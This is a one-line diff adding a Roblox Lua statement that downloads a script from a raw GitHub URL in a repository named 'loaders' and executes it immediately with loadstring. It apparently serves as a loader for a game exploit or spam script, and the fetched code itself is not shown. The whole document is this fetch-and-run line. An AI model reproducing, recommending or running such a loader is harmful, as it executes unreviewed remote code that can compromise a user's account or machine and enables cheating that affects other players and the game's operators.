@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/clone-baby-care-anomaly-spam3-x2rlciuun0wger.lua"))()
